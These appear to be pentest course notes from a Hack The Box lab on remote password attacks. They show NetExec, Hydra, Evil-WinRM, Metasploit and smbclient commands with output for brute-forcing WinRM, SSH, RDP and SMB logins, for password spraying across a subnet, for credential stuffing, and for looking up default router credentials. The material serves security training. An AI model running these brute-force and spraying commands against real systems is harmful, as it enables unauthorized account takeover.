- [Remote Password Attacks](#remote-password-attacks)
  - [WinRM](#winrm)
  - [NetExec](#netexec)
    - [Installing](#installing)
    - [Menu Options](#menu-options)
    - [Protocol-Specific Help](#protocol-specific-help)
    - [Usage](#usage)
    - [Example](#example)
  - [Evil-WinRM](#evil-winrm)
    - [Installing](#installing-1)
    - [Usage](#usage-1)
    - [Example](#example-1)
  - [SSH](#ssh)
  - [Hydra](#hydra)
  - [RDP](#rdp)
  - [Hydra](#hydra-1)
  - [xFreeRDP](#xfreerdp)
    - [Usage](#usage-2)
    - [Example](#example-2)
  - [SMB](#smb)
  - [Hydra](#hydra-2)
    - [Example](#example-3)
    - [Error](#error)
  - [Metasploit](#metasploit)
  - [NetExec](#netexec-1)
  - [SMB](#smb-1)
  - [Spraying, Stuffing, and Defaults](#spraying-stuffing-and-defaults)
  - [Password Spraying](#password-spraying)
  - [Credential Stuffing](#credential-stuffing)
  - [Default Credentials](#default-credentials)

---

# Remote Password Attacks

During your pentests, every computer network you encounter will have services installed to manage, edit, or create content. All these services are hosted using specific permissions and are assigned to specific users. Apart from web apps, these services include FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, and LDAP.

## WinRM

... is the Microsoft implementation of the Web Service Management Protocol. It is a network protocol based on XML web services using the Simple Object Access Protocol used for remote management of Windows systems. It takes care of the communication between Web-Based Enterprise Management and the Windows Management Instrumentation, which can call the Distributed Component Object Model.

By default, WinRM uses the TCP ports 5985 and 5986.

A handy tool you can use for your password attacks is NetExec, which can also be used for other protocols such as SMB, LDAP, MSSQL, and others.

## NetExec

### Installing

```bash
d41y@htb[/htb]$ sudo apt-get -y install netexec
```

### Menu Options

```bash
d41y@htb[/htb]$ netexec -h

usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc} ...

     .   .
    .|   |.     _   _          _     _____
    ||   ||    | \ | |   ___  | |_  | ____| __  __   ___    ___
    \\( )//    |  \| |  / _ \ | __| |  _|   \ \/ /  / _ \  / __|
    .=[ ]=.    | |\  | |  __/ | |_  | |___   >  <  |  __/ | (__
   / /ॱ-ॱ\ \   |_| \_|  \___|  \__| |_____| /_/\_\  \___|  \___|
   ॱ \   / ॱ
     ॱ   ॱ

    The network execution tool
    Maintained as an open source project by @NeffIsBack, @MJHallenbeck, @_zblurx
    
    For documentation and usage examples, visit: https://www.netexec.wiki/

    Version : 1.3.0
    Codename: NeedForSpeed
    Commit  : Kali Linux
    

options:
  -h, --help            show this help message and exit

Generic:
  Generic options for nxc across protocols

  --version             Display nxc version
  -t, --threads THREADS
                        set how many concurrent threads to use
  --timeout TIMEOUT     max timeout in seconds of each thread
  --jitter INTERVAL     sets a random delay between each authentication

Output:
  Options to set verbosity levels and control output

  --verbose             enable verbose output
  --debug               enable debug level information
  --no-progress         do not displaying progress bar during scan
  --log LOG             export result into a custom file

DNS:
  -6                    Enable force IPv6
  --dns-server DNS_SERVER
                        Specify DNS server (default: Use hosts file & System DNS)
  --dns-tcp             Use TCP instead of UDP for DNS queries
  --dns-timeout DNS_TIMEOUT
                        DNS query timeout in seconds

Available Protocols:
  {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc}
    nfs                 own stuff using NFS
    ftp                 own stuff using FTP
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM
    smb                 own stuff using SMB
    wmi                 own stuff using WMI
    rdp                 own stuff using RDP
    mssql               own stuff using MSSQL
    ldap                own stuff using LDAP
    vnc                 own stuff using VNC
```

### Protocol-Specific Help

```bash
d41y@htb[/htb]$ netexec smb -h

usage: netexec smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
                   [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding] [--no-bruteforce]
                   [--continue-on-success] [--gfail-limit LIMIT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache] [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST]
                   [--server {http,https}] [--server-host HOST] [--server-port PORT] [--connectback-host CHOST] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options]
                   [-H HASH [HASH ...]] [--delegate DELEGATE] [--self] [-d DOMAIN | --local-auth] [--port PORT] [--share SHARE] [--smb-server-port SMB_SERVER_PORT]
                   [--gen-relay-list OUTPUT_FILE] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]] [--sam] [--lsa] [--ntds [{vss,drsuapi}]] [--dpapi [{cookies,nosystem} ...]]
                   [--sccm [{disk,wmi}]] [--mkfile MKFILE] [--pvk PVK] [--enabled] [--user USERNTDS] [--shares] [--interfaces] [--no-write-check]
                   [--filter-shares FILTER_SHARES [FILTER_SHARES ...]] [--sessions] [--disks] [--loggedon-users-filter LOGGEDON_USERS_FILTER] [--loggedon-users] [--users [USER ...]]
                   [--groups [GROUP]] [--computers [COMPUTER]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE] [--spider SHARE]
                   [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--depth DEPTH] [--only-files] [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]]
                   [--put-file FILE FILE] [--get-file FILE FILE] [--append-host] [--exec-method {atexec,wmiexec,mmcexec,smbexec}] [--dcom-timeout DCOM_TIMEOUT]
                   [--get-output-tries GET_OUTPUT_TRIES] [--codec CODEC] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts] [--force-ps32]
                   [--no-encode]
                   target [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

<SNIP>
```

### Usage

```bash
d41y@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

### Example

```bash
d41y@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

The appearance of ```(Pwn3d!)``` is the sign that you can most likely execute system commands if you log in with the brute-forced user.

## Evil-WinRM

Another handy tool that you can use to communicate with the WinRM service is Evil-WinRM, which allows you to communicate with the WinRM service efficiently.

### Installing

```bash
d41y@htb[/htb]$ sudo gem install evil-winrm

Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :)
```

### Usage

```bash
d41y@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

### Example

```bash
d41y@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

## SSH

... is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on TCP port 22 by defauolt, to which you can connect using an SSH client.

## Hydra

You can use a tool like Hydra to brute force SSH.

```bash
d41y@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

To log in to the system via the SSH protocol, you can use the OpenSSH client, which is available by default on most Linux distros.

```bash
d41y@htb[/htb]$ ssh user@10.129.42.197

The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.42.197' (ECDSA) to the list of known hosts.


user@10.129.42.197's password: ********

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:\Users\user>
```

## RDP

... is a network protocol that allows remote access to Windows systems via TCP port 3389, by default. RDP provides both users and administrators/support staff with remote access to Windows hosts within an organization. The Remote Desktop Protocol defines two participants for a connection: a so-called terminal server, on which the actual work takes place, and a terminal client, via which the terminal is remotely controlled. In addition to the exchange of image, sound, keyboard, and pointing device, the RDP can also print documents of the terminal server on a printer connected to the terminal client or allow access to storage media available there. Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. The protocol is used by various official Microsoft apps, but is also used in some third-party solutions.

## Hydra

```bash
d41y@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

## xFreeRDP

Linux offers different clients to communicate with the desired server using the RDP protocol. These include Remmina, xfreerdp, and many others.

### Usage

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

### Example

```bash
d41y@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password

<SNIP>

New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb

Do you trust the above certificate? (Y/T/N) Y
```

... spawns a new window with a running Windows session.

## SMB

... is a protocol responsible for transferring data between a client and a server in local area network. It is used to implement file and directory sharing and printing services in Windows networks. SMB is often referred to as a file system, but it is not. SMB can be compared to NFS for Unix and Linux for providing drives on local networks.

It is also known as Common Internet File System (_CIFS_). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux or macOS. In addition, you will often encounter Samba, which is an open-source implementation of the above functions. For SMB, you can also use Hydra again to try different usernames in combination with different passwords.

## Hydra

### Example

```bash
d41y@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```

### Error

However, you may also get the following error describing that the server has sent an invalid reply.

```bash
d41y@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

This is because you most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, you can manually update and recompile Hydra or use another tool, like Metasploit.

## Metasploit

```bash
d41y@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## NetExec

Now you can use NetExec again to view the available shares and what privileges you have for them.

```bash
d41y@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares

SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```

## SMB

To communicate with the server via SMB, you can use, for example, the tool smbclient. This tool will allow you to view the contents of the shares, upload, or download files if your privileges allow it.

```bash
d41y@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME

Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \> 
```

## Spraying, Stuffing, and Defaults

## Password Spraying

... is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts. This technique can be particularly effective in environments where users are initialized with a default or standard password. For example, if it is known that administrators at a particular company commonly use ```ChangeMe123!``` when setting up new accounts, it would be worthwhile to spray this password across all user accounts to identify any that were not updated.

Depending on the target system, different tools may be used to carry out password spraying attacks. For web apps, Burp is a strong option, while for AD environments, tools such as NetExec or Kerbrute are commonly used.

```bash
d41y@htb[/htb]$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```

## Credential Stuffing

... is another type of brute-force attack in which an attacker uses stolen credentials from one service to attempt access on others. Since many users reuse their usernames and passwords across multiple platforms, these attacks are sometimes successful. As with password spraying, credential stuffing can be carried out using a variety of tools, depending on the target system. For example, if you have a list of ```username:password``` credentials obtained from a database leak, you can use Hydra to perform a credential stuffing attack against an SSH service using the following syntax:

```bash
d41y@htb[/htb]$ hydra -C user_pass.list ssh://10.100.38.23
```

## Default Credentials

Many systems - such as routers, firewalls, and databases - come with defautl credentials. While best practice dictates that admins change these credentials during setup, they are sometimes left unchanged, posing a serious security risk.

While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet), which can be installed with ```pip3```.

```bash
d41y@htb[/htb]$ pip3 install defaultcreds-cheat-sheet
```

Once installed, you can use the ```creds``` command to search for known default credentials associated with a specific product or vendor.

```bash
d41y@htb[/htb]$ creds search linksys

+---------------+---------------+------------+
| Product       |    username   |  password  |
+---------------+---------------+------------+
| linksys       |    <blank>    |  <blank>   |
| linksys       |    <blank>    |   admin    |
| linksys       |    <blank>    | epicrouter |
| linksys       | Administrator |   admin    |
| linksys       |     admin     |  <blank>   |
| linksys       |     admin     |   admin    |
| linksys       |    comcast    |    1234    |
| linksys       |      root     |  orion99   |
| linksys       |      user     |  tivonpw   |
| linksys (ssh) |     admin     |   admin    |
| linksys (ssh) |     admin     |  password  |
| linksys (ssh) |    linksys    |  <blank>   |
| linksys (ssh) |      root     |   admin    |
+---------------+---------------+------------+
```

In addition to publicly available lists and tools, default credentials can often be found in product documentation, which typically outlines the steps required to set up a service. While some devices and applications prompt the user to set a password during installation, others use a default - often weak - password.

Imagine you have identified certain apps in use on a customer's network. After researching the default credentials online, you can combine them into a new list, formatted as ```username:password```, and reuse the previously mentioned Hydra to attempt access.

Beyond apps, default credentials are also commonly associated with routers. One such list is available [here](https://www.softwaretestinghelp.com/default-router-username-and-password-list/). While it is less likely that the router credentials remain unchanged, oversights do occur. Routers used in internal testing environments, for example, may be left with default settings and can be exploited to gain further access.
